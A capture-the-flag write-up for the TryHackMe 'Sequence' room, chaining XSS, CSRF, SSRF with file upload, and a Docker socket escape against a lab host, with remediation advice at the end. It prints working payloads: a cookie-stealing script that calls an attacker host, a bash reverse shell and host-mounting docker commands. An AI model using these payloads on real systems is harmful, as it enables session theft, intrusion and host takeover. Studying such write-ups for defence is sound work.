# Sequence — TryHackMe Writeup

> **Room:** [Sequence](https://tryhackme.com/room/sequence) · **Difficulty:** MAX (Hard)
> **Category:** Web / Boot2Root (XSS → CSRF → SSRF → Docker escape)
> **Author of writeup:** 0xnyx
> **Goal:** Chain multiple vulnerabilities on `review.thm` to go from anonymous → mod → admin → host root.

> ⚠️ In line with TryHackMe's write-up policy, **no flags or cracked values are included** — only the method, so you can reproduce every step yourself.

---

## How to read this writeup

Each step is **Do** (the command/action) → **You get** (what comes back) → **Why / what next** (what it means and where it leads). This is a 5-link chain, one vulnerability feeding the next:

`Blind XSS → cookie theft (mod) → CSRF privilege escalation (admin) → SSRF + file upload (RCE) → Docker socket escape (host root)`

---

## Step 1 — Recon

**Do**

```bash
echo "<TARGET> review.thm" | sudo tee -a /etc/hosts
nmap -sVC -T4 -Pn review.thm
feroxbuster -u http://review.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt
curl -s http://review.thm/mail/dump.txt
```

**You get**

- **22** (SSH) + **80** (Apache, PHP "Review Shop"). nmap flags `PHPSESSID` with **`HttpOnly` NOT set**.
- Endpoints: `login.php`, `contact.php`, `dashboard.php`, `settings.php`, `chat.php`, `admin_view.php`, `uploads/`, `phpmyadmin/`, **`mail/dump.txt`**.
- `mail/dump.txt` is an internal email leaking: a **Finance panel** (`/finance.php`) and **Lottery panel** (`/lottery.php`) on an internal `192.x` network, protected by an **8-character password** (save it — it's needed for the root stage).

**Why / what next** — `HttpOnly` off means a successful XSS can read `document.cookie`. The contact form is the obvious attacker-controlled input that a staff member will review.

---

## Step 2 — Mod access (Blind XSS → cookie theft)

**Do** — The contact form (`name`, `phone`, `message`) is reviewed by a logged-in staff bot. Plant a cookie-stealer; run a catcher on your box first.

```bash
# catcher:
python3 -m http.server 8000

# submit the payload:
P='<script>new Image().src="http://<ATTACKER>:8000/?c="+document.cookie</script>'
curl -s http://review.thm/contact.php -X POST \
  --data-urlencode "name=$P" --data-urlencode "phone=1" --data-urlencode "message=$P"
```

**You get** — After ~1 minute the catcher logs `GET /?c=PHPSESSID=...` — the **mod's** session cookie.

**Why / what next** — Use that cookie to access the dashboard as the mod.

```bash
curl -s -b "PHPSESSID=<STOLEN>" http://review.thm/dashboard.php      # -> "logged in as mod", MOD FLAG in the header
```

The dashboard's **User Table** shows `admin` (id 2) and `mod` (id 3). Next: become admin.

---

## Step 3 — Admin access (CSRF with a predictable token)

**Do** — `settings.php` has a **Promote Co-Admin** feature: `GET promote_coadmin.php?username=X&csrf_token_promote=TOKEN`. The CSRF token is just **`md5(username)`** — confirm it:

```bash
echo -n mod   | md5sum     # == the mod's csrf_token on settings.php
echo -n admin | md5sum     # == the admin's token
```

Self-promoting is blocked ("only available for admins"), so the **admin** must trigger it. Deliver a link in **chat** (the admin reads chat and clicks links); the chat escapes HTML, so a plain URL becomes a clickable link that carries the admin's token:

```bash
curl -s -b "PHPSESSID=<STOLEN>" http://review.thm/chat.php -X POST \
  --data-urlencode 'message=http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=<MD5_OF_ADMIN>'
```

**You get** — After the admin clicks it, the dashboard User Table shows the **mod** row's role flip to `admin`.

**Why / what next** — The role is cached in the session, so the stolen mod session still behaves as mod — you must **re-login**. You don't have the mod's password, but `settings.php` lets you change it (the CSRF token is `md5(mod)`):

```bash
curl -s -b "PHPSESSID=<STOLEN>" http://review.thm/update_password.php -X POST \
  --data-urlencode 'new_password=<NEWPASS>' --data-urlencode 'csrf_token=<MD5_OF_MOD>'
```

The login field is named `email`, but the backend accepts the **username** `mod`:

```bash
curl -s -i http://review.thm/login.php -X POST \
  --data-urlencode 'email=mod' --data-urlencode 'password=<NEWPASS>' -c mod.txt
curl -s -b mod.txt http://review.thm/dashboard.php      # -> "logged in as admin", ADMIN FLAG
```

---

## Step 4 — RCE (SSRF → internal finance panel → unrestricted upload)

**Do** — The admin dashboard has a **feature selector** that makes the server fetch an internal page (`lottery.php`) and render it — an **SSRF**. Point it at the internal `finance.php`:

```bash
curl -s -b mod.txt http://review.thm/dashboard.php -X POST --data-urlencode "feature=finance.php"
```

**You get** — The internal Finance Panel, with a password overlay **and** an upload form (`investor_file`). Reading the page's obfuscated JS shows the password check is **client-side only** (the 8-char password is hard-coded in the script) — so `curl` bypasses it entirely. The upload has **no extension filtering**.

**Why / what next** — Upload a PHP reverse shell; the dashboard forwards the multipart POST to the internal finance server. Start a listener first.

```bash
# shell.php:
echo '<?php system("bash -c '"'"'bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1'"'"'"); ?>' > shell.php
# listener:  nc -lvnp <PORT>

# upload through the SSRF:
curl -s -b mod.txt http://review.thm/dashboard.php -F "feature=finance.php" -F "investor_file=@shell.php"
# -> "File uploaded successfully ... Path: uploads/shell.php"

# trigger it via the SSRF (server fetches & executes the internal PHP):
curl -s -b mod.txt http://review.thm/dashboard.php -F "feature=uploads/shell.php"
```

**You get** — A shell as **root inside the finance container** (`/.dockerenv` present).

---

## Step 5 — Host root (Docker socket escape)

**Do** — Enumerate the container for an escape.

```bash
id; hostname; ls -la /.dockerenv
which docker; docker ps
ls -la /var/run/docker.sock
```

**You get**

```
/usr/bin/docker
/var/run/docker.sock   (accessible as root)
docker ps -> lists the running containers
```

**Why / what next** — The container can talk to the **host's Docker daemon** via the mounted `docker.sock`. Anyone who controls the Docker daemon is effectively root on the host: spawn a new container that **bind-mounts the host's `/`**, and you can read (or write) any host file as root.

```bash
docker run -v /:/host phpvulnerable ls -la /host/root/
docker run -v /:/host phpvulnerable cat /host/root/flag.txt      # <ROOT FLAG>
```

**You get** — The host root flag. Box fully owned. 🏁

> To go further than reading the flag, the same mount lets you drop an SSH key into `/host/root/.ssh/`, or `chroot /host` for a full host-root shell.

---

## The full chain at a glance

| Step | Vulnerability | Result |
|------|---------------|--------|
| 1 | Recon + `mail/dump.txt` | Endpoints + finance password |
| 2 | Blind XSS (`HttpOnly` off) | Steal mod cookie → mod flag |
| 3 | CSRF, token = `md5(username)` | Promote mod→admin → re-login → admin flag |
| 4 | SSRF + unrestricted upload | PHP shell → container root |
| 5 | Exposed `docker.sock` | `docker run -v /:/host` → host root flag |

## Lessons

- `HttpOnly` off + a staff bot that reviews user input = **Blind XSS → session theft**.
- A **predictable CSRF token** (here `md5(username)`) is no protection; deliver the forged request to a privileged victim (chat link the admin clicks).
- Client-side password/validation is **not** security — `curl` ignores the JS. **Unrestricted file upload = RCE.**
- An **SSRF feature** that fetches internal pages can also forward a file upload and then execute it.
- A reachable **`/var/run/docker.sock`** inside a container is an instant host-root escape: `docker run -v /:/host <image>`.

## Remediation

- Set `HttpOnly` + `Secure` on session cookies; output-encode all user content; add a strict CSP.
- Use unpredictable, per-session CSRF tokens; re-check authorization server-side on every privileged action.
- Validate uploads server-side (type, extension, content) and store them outside the web root; never trust client-side checks.
- Don't expose internal panels via an open SSRF fetcher; allow-list destinations.
- Never mount the Docker socket into a container that runs untrusted code.

---

*Write-up for [TryHackMe — Sequence](https://tryhackme.com/room/sequence).*
